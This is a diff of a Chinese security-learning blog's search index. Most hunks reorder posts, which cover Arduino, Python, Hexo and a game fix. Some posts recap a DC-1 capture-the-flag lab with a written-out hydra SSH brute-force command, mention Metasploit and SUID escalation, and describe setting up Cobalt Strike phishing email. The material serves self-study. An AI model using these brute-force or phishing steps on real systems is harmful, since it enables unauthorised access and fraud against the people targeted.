 <p>也可以用kalissh远程登陆（推荐用这个，vmbox太tm蛋疼了）</p>
-<p>ssh <a class="link" href="mailto:&#102;&#108;&#x61;&#x67;&#x34;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x31;&#x32;&#x34;&#x2e;&#x37;&#54;">&#102;&#108;&#x61;&#x67;&#x34;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#x31;&#x32;&#x34;&#x2e;&#x37;&#54;<i class="fas fa-external-link-alt"></i></a></p>
+<p>ssh <a class="link" href="mailto:&#102;&#x6c;&#97;&#x67;&#52;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x31;&#50;&#x34;&#46;&#55;&#x36;">&#102;&#x6c;&#97;&#x67;&#52;&#64;&#49;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#x2e;&#x31;&#50;&#x34;&#46;&#55;&#x36;<i class="fas fa-external-link-alt"></i></a></p>
 <img src="1503868-20191008194735795-928890603.png" alt>
 
 <p> </p>
@@ -2300,7 +2300,7 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <p>做完这个感觉自己真的很菜，在此总结一下这个过程中了解到的，学到的，以及还不懂的知识</p>
 <p>1.arp-scan -l 　　用来扫描局域网内的主机。（参考<a class="link" href="https://blog.csdn.net/weixin_43221560/article/details/90550294">https://blog.csdn.net/weixin_43221560/article/details/90550294<i class="fas fa-external-link-alt"></i></a>）</p>
 <p>2.用 msf5来reach drupal寻找漏洞，配置并使用这些漏洞（一知半解，还得好好学习），</p>
-<p>3.ssh远程连接，如在渗透过程中使用到的  ssh <a class="link" href="mailto:&#102;&#x6c;&#97;&#x67;&#x34;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#49;&#x32;&#x34;&#46;&#55;&#54;">&#102;&#x6c;&#97;&#x67;&#x34;&#64;&#x31;&#57;&#50;&#46;&#49;&#x36;&#56;&#x2e;&#49;&#x32;&#x34;&#46;&#55;&#54;<i class="fas fa-external-link-alt"></i></a>。挺方便的</p>
+<p>3.ssh远程连接，如在渗透过程中使用到的  ssh <a class="link" href="mailto:&#102;&#x6c;&#x61;&#103;&#x34;&#64;&#49;&#57;&#x32;&#46;&#49;&#x36;&#56;&#46;&#49;&#x32;&#x34;&#46;&#x37;&#x36;">&#102;&#x6c;&#x61;&#103;&#x34;&#64;&#49;&#57;&#x32;&#46;&#49;&#x36;&#56;&#46;&#49;&#x32;&#x34;&#46;&#x37;&#x36;<i class="fas fa-external-link-alt"></i></a>。挺方便的</p>
 <p>4.john the Ripper +hydra 爆破，（john下载安装参考<a class="link" href="https://blog.csdn.net/Romanticduan/article/details/81233479">https://blog.csdn.net/Romanticduan/article/details/81233479<i class="fas fa-external-link-alt"></i></a>，使用参考<a class="link" href="https://blog.csdn.net/qq_36119192/article/details/83373895">https://blog.csdn.net/qq_36119192/article/details/83373895<i class="fas fa-external-link-alt"></i></a>）</p>
 <p>hydra -l flag4 -P /root/john-1.8.0/run/password.lst ssh://192.168.124.76（也是一知半解，同样得学）</p>
 <p>5.suid提权</p>
@@ -2418,40 +2418,6 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
-    <title>arduino的mouse使用</title>
-    <url>/2021/03/28/arduino%E7%9A%84mouse%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<p>&lt;主要来源于：<a class="link" href="https://www.arduino.cc/en/Reference.MouseKeyboard&gt;">https://www.arduino.cc/en/Reference.MouseKeyboard&gt;<i class="fas fa-external-link-alt"></i></a></p>
-<h1 id="各种函数"><a href="#各种函数" class="headerlink" title="各种函数"></a>各种函数</h1><h2 id="begin"><a href="#begin" class="headerlink" title="begin()"></a>begin()</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>开始模拟连接到计算机的鼠标。 必须在控制计算机之前调用begin()。 要结束控制，请使用Mouse.end()。</p>
-<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.begin()</code></p>
-<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>无</p>
-<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
-<h2 id="click"><a href="#click" class="headerlink" title="click()"></a>click()</h2><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><p>向光标所在位置的计算机发送短暂的点击。这与按下(press)并立即释放(release)鼠标按钮是相同的。<br>click()默认为鼠标左键。</p>
-<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p>Mouse.click()<br>Mouse.click(button)</p>
-<h3 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h3><p>button:按下的鼠标按钮允许的数据类型： char.<br><code>MOUSE_LEFT (默认)</code><br><code>MOUSE_RIGHT</code><br><code>MOUSE_MIDDLE</code> </p>
-<h3 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
-<h2 id="end"><a href="#end" class="headerlink" title="end()"></a>end()</h2><h3 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h3><p>停止模拟连接到计算机的鼠标。 要开始控制，请使用Mouse.begin（）。</p>
-<h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.end()</code></p>
-<h3 id="参数-2"><a href="#参数-2" class="headerlink" title="参数"></a>参数</h3><p>无</p>
-<h3 id="返回值-2"><a href="#返回值-2" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
-<h2 id="move"><a href="#move" class="headerlink" title="move()"></a>move()</h2><h3 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h3><p>在连接的计算机上移动光标。 屏幕上的运动总是相对于光标的当前位置。 使用Mouse.move（）之前，必须先调用Mouse.begin（） </p>
-<h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.move(xVal, yVal, wheel)</code></p>
-<h3 id="参数-3"><a href="#参数-3" class="headerlink" title="参数"></a>参数</h3><p>xVal: 沿x轴移动的量。 允许的数据类型: signed char.<br>yVal: 沿y轴移动的量。 允许的数据类型: signed char.<br>wheel: 移动滚轮的数量。 允许的数据类型: signed char.</p>
-<h3 id="返回值-3"><a href="#返回值-3" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
-<h2 id="press"><a href="#press" class="headerlink" title="press()"></a>press()</h2><h3 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h3><p>将按钮按下发送到连接的计算机。 按下相当于单击并连续按住鼠标按钮。 通过Mouse.release（）取消了按下。<br>在使用Mouse.press（）之前，您需要开始与Mouse.begin（）进行通信。<br>Mouse.press（）默认为鼠标左键按下。</p>
-<h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.press()</code><br><code>Mouse.press(button)</code></p>
-<h3 id="参数-4"><a href="#参数-4" class="headerlink" title="参数"></a>参数</h3><p>button: 按下的鼠标按钮允许的数据类型: char.<br><code>MOUSE_LEFT (默认)</code><br><code>MOUSE_RIGHT</code><br><code>MOUSE_MIDDLE</code></p>
-<h3 id="返回值-4"><a href="#返回值-4" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
-<h2 id="release"><a href="#release" class="headerlink" title="release()"></a>release()</h2><h3 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h3><p>发送一条消息，指出先前按下的按钮（通过Mouse.press（）调用）已释放。 Mouse.release（）默认为左侧按钮。</p>
-<h3 id="语法-5"><a href="#语法-5" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.release()</code><br><code>Mouse.release(button)</code></p>
-<h3 id="参数-5"><a href="#参数-5" class="headerlink" title="参数"></a>参数</h3><p>button: 按下的鼠标按钮允许的数据类型: char.<br><code>MOUSE_LEFT (默认)</code><br><code>MOUSE_RIGHT</code><br><code>MOUSE_MIDDLE</code></p>
-<h3 id="返回值-5"><a href="#返回值-5" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
-<h2 id="isPressed"><a href="#isPressed" class="headerlink" title="isPressed()"></a>isPressed()</h2><h3 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h3><p>检查所有鼠标按钮的当前状态，并报告是否按下任何鼠标按钮。</p>
-<h3 id="语法-6"><a href="#语法-6" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.isPressed();</code><br><code>Mouse.isPressed(button);</code></p>
-<h3 id="参数-6"><a href="#参数-6" class="headerlink" title="参数"></a>参数</h3><p>button: 按下的鼠标按钮允许的数据类型: char.<br><code>MOUSE_LEFT (默认)</code><br><code>MOUSE_RIGHT</code><br><code>MOUSE_MIDDLE</code></p>
-<h3 id="返回值-6"><a href="#返回值-6" class="headerlink" title="返回值"></a>返回值</h3><p>报告按钮是否被按下。数据类型:bool。</p>
-]]></content>
-  </entry>
-  <entry>
     <title>cobalt strike入门学习</title>
     <url>/2020/06/12/cobalt%20strike%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13110385.html">源地址：https://www.cnblogs.com/This-is-Y/p/13110385.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -2530,6 +2496,40 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       <categories>
         <category>cnblogs</category>
       </categories>
+  </entry>
+  <entry>
+    <title>arduino的mouse使用</title>
+    <url>/2021/03/28/arduino%E7%9A%84mouse%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>&lt;主要来源于：<a class="link" href="https://www.arduino.cc/en/Reference.MouseKeyboard&gt;">https://www.arduino.cc/en/Reference.MouseKeyboard&gt;<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="各种函数"><a href="#各种函数" class="headerlink" title="各种函数"></a>各种函数</h1><h2 id="begin"><a href="#begin" class="headerlink" title="begin()"></a>begin()</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>开始模拟连接到计算机的鼠标。 必须在控制计算机之前调用begin()。 要结束控制，请使用Mouse.end()。</p>
+<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.begin()</code></p>
+<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>无</p>
+<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
+<h2 id="click"><a href="#click" class="headerlink" title="click()"></a>click()</h2><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><p>向光标所在位置的计算机发送短暂的点击。这与按下(press)并立即释放(release)鼠标按钮是相同的。<br>click()默认为鼠标左键。</p>
+<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p>Mouse.click()<br>Mouse.click(button)</p>
+<h3 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h3><p>button:按下的鼠标按钮允许的数据类型： char.<br><code>MOUSE_LEFT (默认)</code><br><code>MOUSE_RIGHT</code><br><code>MOUSE_MIDDLE</code> </p>
+<h3 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
+<h2 id="end"><a href="#end" class="headerlink" title="end()"></a>end()</h2><h3 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h3><p>停止模拟连接到计算机的鼠标。 要开始控制，请使用Mouse.begin（）。</p>
+<h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.end()</code></p>
+<h3 id="参数-2"><a href="#参数-2" class="headerlink" title="参数"></a>参数</h3><p>无</p>
+<h3 id="返回值-2"><a href="#返回值-2" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
+<h2 id="move"><a href="#move" class="headerlink" title="move()"></a>move()</h2><h3 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h3><p>在连接的计算机上移动光标。 屏幕上的运动总是相对于光标的当前位置。 使用Mouse.move（）之前，必须先调用Mouse.begin（） </p>
+<h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.move(xVal, yVal, wheel)</code></p>
+<h3 id="参数-3"><a href="#参数-3" class="headerlink" title="参数"></a>参数</h3><p>xVal: 沿x轴移动的量。 允许的数据类型: signed char.<br>yVal: 沿y轴移动的量。 允许的数据类型: signed char.<br>wheel: 移动滚轮的数量。 允许的数据类型: signed char.</p>
+<h3 id="返回值-3"><a href="#返回值-3" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
+<h2 id="press"><a href="#press" class="headerlink" title="press()"></a>press()</h2><h3 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h3><p>将按钮按下发送到连接的计算机。 按下相当于单击并连续按住鼠标按钮。 通过Mouse.release（）取消了按下。<br>在使用Mouse.press（）之前，您需要开始与Mouse.begin（）进行通信。<br>Mouse.press（）默认为鼠标左键按下。</p>
+<h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.press()</code><br><code>Mouse.press(button)</code></p>
+<h3 id="参数-4"><a href="#参数-4" class="headerlink" title="参数"></a>参数</h3><p>button: 按下的鼠标按钮允许的数据类型: char.<br><code>MOUSE_LEFT (默认)</code><br><code>MOUSE_RIGHT</code><br><code>MOUSE_MIDDLE</code></p>
+<h3 id="返回值-4"><a href="#返回值-4" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
+<h2 id="release"><a href="#release" class="headerlink" title="release()"></a>release()</h2><h3 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h3><p>发送一条消息，指出先前按下的按钮（通过Mouse.press（）调用）已释放。 Mouse.release（）默认为左侧按钮。</p>
+<h3 id="语法-5"><a href="#语法-5" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.release()</code><br><code>Mouse.release(button)</code></p>
+<h3 id="参数-5"><a href="#参数-5" class="headerlink" title="参数"></a>参数</h3><p>button: 按下的鼠标按钮允许的数据类型: char.<br><code>MOUSE_LEFT (默认)</code><br><code>MOUSE_RIGHT</code><br><code>MOUSE_MIDDLE</code></p>
+<h3 id="返回值-5"><a href="#返回值-5" class="headerlink" title="返回值"></a>返回值</h3><p>无</p>
+<h2 id="isPressed"><a href="#isPressed" class="headerlink" title="isPressed()"></a>isPressed()</h2><h3 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h3><p>检查所有鼠标按钮的当前状态，并报告是否按下任何鼠标按钮。</p>
+<h3 id="语法-6"><a href="#语法-6" class="headerlink" title="语法"></a>语法</h3><p><code>Mouse.isPressed();</code><br><code>Mouse.isPressed(button);</code></p>
+<h3 id="参数-6"><a href="#参数-6" class="headerlink" title="参数"></a>参数</h3><p>button: 按下的鼠标按钮允许的数据类型: char.<br><code>MOUSE_LEFT (默认)</code><br><code>MOUSE_RIGHT</code><br><code>MOUSE_MIDDLE</code></p>
+<h3 id="返回值-6"><a href="#返回值-6" class="headerlink" title="返回值"></a>返回值</h3><p>报告按钮是否被按下。数据类型:bool。</p>
+]]></content>
   </entry>
   <entry>
     <title>docker学习笔记</title>
@@ -3819,33 +3819,6 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
-    <title>python format() 格式化输出</title>
-    <url>/2020/10/18/python%20format()%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13806255.html">源地址：https://www.cnblogs.com/This-is-Y/p/13806255.html<i class="fas fa-external-link-alt"></i></a></p>
-<p><strong>进制转换问题</strong></p>
-<p>二进制-Binary-b</p>
-<p>八进制-Octal-o</p>
-<p>十进制-Decimal-d</p>
-<p>十六进制-Hexadecimal-x</p>
-<p>效果如图</p>
-<img src="1503868-20201018092410558-702270383.png" alt>
-
-<p> </p>
-<p>代码👇</p>
-<p> </p>
-<p>位置匹配</p>
-<p>效果</p>
-<img src="1503868-20201018093842583-71552239.png" alt loading="lazy">
-
-<p> </p>
-<p>代码👇</p>
-<p> 参考：<a class="link" href="https://www.cnblogs.com/fat39/p/7159881.html">https://www.cnblogs.com/fat39/p/7159881.html<i class="fas fa-external-link-alt"></i></a></p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
     <title>python UDP多线程通信，以及自己加的花里胡哨、乱七八糟的东西</title>
     <url>/2021/03/12/python%20UDP%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1%EF%BC%8C%E4%BB%A5%E5%8F%8A%E8%87%AA%E5%B7%B1%E5%8A%A0%E7%9A%84%E8%8A%B1%E9%87%8C%E8%83%A1%E5%93%A8%E3%80%81%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F%E7%9A%84%E4%B8%9C%E8%A5%BF/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14526761.html">源地址：https://www.cnblogs.com/This-is-Y/p/14526761.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -3890,6 +3863,33 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <img src="1503868-20210312222219445-1902128098.png" width="1200" loading="lazy">
 
 <p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>python format() 格式化输出</title>
+    <url>/2020/10/18/python%20format()%20%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13806255.html">源地址：https://www.cnblogs.com/This-is-Y/p/13806255.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>进制转换问题</strong></p>
+<p>二进制-Binary-b</p>
+<p>八进制-Octal-o</p>
+<p>十进制-Decimal-d</p>
+<p>十六进制-Hexadecimal-x</p>
+<p>效果如图</p>
+<img src="1503868-20201018092410558-702270383.png" alt>
+
+<p> </p>
+<p>代码👇</p>
+<p> </p>
+<p>位置匹配</p>
+<p>效果</p>
+<img src="1503868-20201018093842583-71552239.png" alt loading="lazy">
+
+<p> </p>
+<p>代码👇</p>
+<p> 参考：<a class="link" href="https://www.cnblogs.com/fat39/p/7159881.html">https://www.cnblogs.com/fat39/p/7159881.html<i class="fas fa-external-link-alt"></i></a></p>
 ]]></content>
       <categories>
         <category>cnblogs</category>
@@ -4091,6 +4091,31 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
+    <title>uplay游戏玩15分钟就强制退出来的解决办法</title>
+    <url>/2020/02/07/uplay%E6%B8%B8%E6%88%8F%E7%8E%A915%E5%88%86%E9%92%9F%E5%B0%B1%E5%BC%BA%E5%88%B6%E9%80%80%E5%87%BA%E6%9D%A5%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12272226.html">源地址：https://www.cnblogs.com/This-is-Y/p/12272226.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>按下win键，输入语言，打开语言设置。</p>
+<img src="1503868-20200207102923968-791006671.png" alt width="558" height="499">
+
+<p> </p>
+<p> 找到首选语言，点击添加首选语言，添加English（US）这个。</p>
+<img src="1503868-20200207103125879-643552617.png" alt width="561" height="291">
+
+<p>然后在启动uplay游戏前，按win+空格切换到英语，这样子就可以愉快的玩耍了，不会再15分钟掉出来了</p>
+<img src="1503868-20200207103645990-231595883.png" alt width="563" height="348">
+
+<p> </p>
+<p>至于为什么切换到就不会掉出来，而用中文，玩15分钟（测试过，15分钟左右，不会偏差太多）就会掉出来，我也不知道，反正让育碧工程师出来挨打就对了。</p>
+<p> gogogo</p>
+<img src="1503868-20200207104406230-773624798.png" alt width="830" height="467">
+
+<p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
     <title>wifi密码破解</title>
     <url>/2020/11/29/wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/14057260.html">源地址：https://www.cnblogs.com/This-is-Y/p/14057260.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -4159,31 +4184,6 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
-    <title>uplay游戏玩15分钟就强制退出来的解决办法</title>
-    <url>/2020/02/07/uplay%E6%B8%B8%E6%88%8F%E7%8E%A915%E5%88%86%E9%92%9F%E5%B0%B1%E5%BC%BA%E5%88%B6%E9%80%80%E5%87%BA%E6%9D%A5%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12272226.html">源地址：https://www.cnblogs.com/This-is-Y/p/12272226.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>按下win键，输入语言，打开语言设置。</p>
-<img src="1503868-20200207102923968-791006671.png" alt width="558" height="499">
-
-<p> </p>
-<p> 找到首选语言，点击添加首选语言，添加English（US）这个。</p>
-<img src="1503868-20200207103125879-643552617.png" alt width="561" height="291">
-
-<p>然后在启动uplay游戏前，按win+空格切换到英语，这样子就可以愉快的玩耍了，不会再15分钟掉出来了</p>
-<img src="1503868-20200207103645990-231595883.png" alt width="563" height="348">
-
-<p> </p>
-<p>至于为什么切换到就不会掉出来，而用中文，玩15分钟（测试过，15分钟左右，不会偏差太多）就会掉出来，我也不知道，反正让育碧工程师出来挨打就对了。</p>
-<p> gogogo</p>
-<img src="1503868-20200207104406230-773624798.png" alt width="830" height="467">
-
-<p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
     <title>使用Cobalr strike发送钓鱼邮件</title>
     <url>/2020/06/18/%E4%BD%BF%E7%94%A8Cobalr%20strike%E5%8F%91%E9%80%81%E9%92%93%E9%B1%BC%E9%82%AE%E4%BB%B6/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13159570.html">源地址：https://www.cnblogs.com/This-is-Y/p/13159570.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -4219,14 +4219,14 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <p> 　　这边的参数选项。</p>
 <p>　　<strong>SMTP host：</strong> 即qq邮箱SMTP服务地址，smtp.qq.com。这个可以自行百度。这里有一篇博客写了这些，但是端口号似乎有些不对，还请自行判断<a class="link" href="https://blog.csdn.net/Gents_hu/article/details/92219811">https://blog.csdn.net/Gents_hu/article/details/92219811<i class="fas fa-external-link-alt"></i></a></p>
 <p>　　<strong>SMTP Port：</strong>即允许SMTP服务的端口号。和上面的host配套来的，这边QQ邮箱的端口号是 465</p>
-<p>　　<strong>Username：</strong>举个例子。比如我的邮箱地址是<a class="link" href="mailto:&#x39;&#x35;&#x32;&#x37;&#49;&#x34;&#x31;&#x33;&#x38;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d;">&#x39;&#x35;&#x32;&#x37;&#49;&#x34;&#x31;&#x33;&#x38;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d;<i class="fas fa-external-link-alt"></i></a>，那这里就填952714138。就是@符号前面的那个</p>
+<p>　　<strong>Username：</strong>举个例子。比如我的邮箱地址是<a class="link" href="mailto:&#x39;&#53;&#50;&#x37;&#49;&#52;&#49;&#51;&#56;&#x40;&#113;&#113;&#x2e;&#99;&#x6f;&#x6d;">&#x39;&#53;&#50;&#x37;&#49;&#52;&#49;&#51;&#56;&#x40;&#113;&#113;&#x2e;&#99;&#x6f;&#x6d;<i class="fas fa-external-link-alt"></i></a>，那这里就填952714138。就是@符号前面的那个</p>
 <p>　　<strong>Password（密码）：</strong>就是前面开启SMTP服务是的那串神秘代码，不是你的qq密码！不是你的qq密码！不是你的qq密码！</p>
 <p>　　<strong>Random Delay：</strong>似乎是等待随机延迟发送（我瞎猜的）。这里默认0就好了。</p>
 <p>　　<strong>Connetion：</strong>连接协议，qq邮箱SMTP服务用的ssl连接，所以这里选ssl</p>
 <p>　　配置好后大概是这个样子</p>
 <p>　　<img src="1503868-20200618201058685-518424786.png" alt loading="lazy"></p>
 <p>　　点解set保存设置。</p>
-<p><strong>bounce to：</strong>这个是根据你的邮件名来填写的，比方说我的邮件地址是<a class="link" href="mailto:&#x39;&#53;&#50;&#55;&#x31;&#x34;&#x31;&#x33;&#56;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#109;">&#x39;&#53;&#50;&#55;&#x31;&#x34;&#x31;&#x33;&#56;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#109;<i class="fas fa-external-link-alt"></i></a>，那么这里就填写<a class="link" href="mailto:&#57;&#53;&#50;&#x37;&#x31;&#x34;&#49;&#51;&#56;&#64;&#x71;&#x71;&#x2e;&#x63;&#x6f;&#109;">&#57;&#53;&#50;&#x37;&#x31;&#x34;&#49;&#51;&#56;&#64;&#x71;&#x71;&#x2e;&#x63;&#x6f;&#109;<i class="fas fa-external-link-alt"></i></a>。当然，qq邮箱有一个英文邮箱账号，填写那个也是可以的。如果填写不正确，cs会报错</p>
+<p><strong>bounce to：</strong>这个是根据你的邮件名来填写的，比方说我的邮件地址是<a class="link" href="mailto:&#57;&#53;&#x32;&#55;&#x31;&#x34;&#x31;&#x33;&#56;&#x40;&#x71;&#113;&#x2e;&#x63;&#111;&#x6d;">&#57;&#53;&#x32;&#55;&#x31;&#x34;&#x31;&#x33;&#56;&#x40;&#x71;&#113;&#x2e;&#x63;&#111;&#x6d;<i class="fas fa-external-link-alt"></i></a>，那么这里就填写<a class="link" href="mailto:&#57;&#x35;&#50;&#x37;&#x31;&#x34;&#49;&#51;&#x38;&#64;&#x71;&#113;&#x2e;&#99;&#111;&#x6d;">&#57;&#x35;&#50;&#x37;&#x31;&#x34;&#49;&#51;&#x38;&#64;&#x71;&#113;&#x2e;&#99;&#111;&#x6d;<i class="fas fa-external-link-alt"></i></a>。当然，qq邮箱有一个英文邮箱账号，填写那个也是可以的。如果填写不正确，cs会报错</p>
 <img src="1503868-20200618195101320-369498795.png" alt loading="lazy">
 
 <p> </p>
@@ -4569,6 +4569,19 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       <categories>
         <category>cnblogs</category>
       </categories>
+  </entry>
+  <entry>
+    <title>在博客中添加自定义页面</title>
+    <url>/2021/06/19/%E5%9C%A8%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E9%A1%B5%E9%9D%A2/</url>
+    <content><![CDATA[<h2 id="创建页面文件夹"><a href="#创建页面文件夹" class="headerlink" title="创建页面文件夹"></a>创建页面文件夹</h2><p>在blog/source下面，创建一个文件夹，里面就是要自定义的网页的全部文件。最好是有过index.html</p>
+<h2 id="网页内容"><a href="#网页内容" class="headerlink" title="网页内容"></a>网页内容</h2><p>比如说我这里是想添加一个小游戏<br>游戏github：<a class="link" href="https://github.com/SadTomlzr/catch-cat">https://github.com/SadTomlzr/catch-cat<i class="fas fa-external-link-alt"></i></a><br>原游戏地址：<a class="link" href="https://sadtomlzr.github.io/catch-cat/">https://sadtomlzr.github.io/catch-cat/<i class="fas fa-external-link-alt"></i></a><br>这里我直接把那几个文件放在新建的文件夹里了</p>
+<p><img src="image-20210619210816615.png" alt="image-20210619210816615"></p>
+<p><img src="image-20210619210832495.png" alt="image-20210619210832495"></p>
+<h2 id="停用渲染"><a href="#停用渲染" class="headerlink" title="停用渲染"></a>停用渲染</h2><p>在hexo的配置文件_config.yml 里的skip_render中添加不需要渲染的文件</p>
+<p>** 注意：skip_render参数设置的路径是相对于source目录的路径。 **，比如D:\MyBlog\source\Cat目录，就写成Cat/*就行了，*表示全部文件，可以</p>
+<p><img src="image-20210619211021410.png" alt="image-20210619211021410"></p>
+<h2 id="入口"><a href="#入口" class="headerlink" title="入口"></a>入口</h2><p>这样添加的页面是在博客中是没有入口的。就是只能输url进去。入口需要在主题里添加，</p>
+]]></content>
   </entry>
   <entry>
     <title>基本的渗透测试流程</title>
@@ -5093,27 +5106,6 @@ insert into test1 value(3,15);
       </categories>
   </entry>
   <entry>
-    <title>检查文件MD5检验文件是否被修改</title>
-    <url>/2020/08/18/%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6MD5%E6%A3%80%E9%AA%8C%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E8%A2%AB%E4%BF%AE%E6%94%B9/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13523493.html">源地址：https://www.cnblogs.com/This-is-Y/p/13523493.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>cmd下，输入certutil -hashfile 文件名 md5</p>
-<p>举个例子</p>
-<img src="1503868-20200818144805053-2036147690.png" alt loading="lazy">
-
-<p> </p>
-<p> 某个工具的下载页面</p>
-<p>下载好后，cmd下执行</p>
-<img src="1503868-20200818144927582-1324965701.png" alt loading="lazy">
-
-<p> </p>
-<p>文件正常</p>
-<p> </p>
-]]></content>
-      <categories>
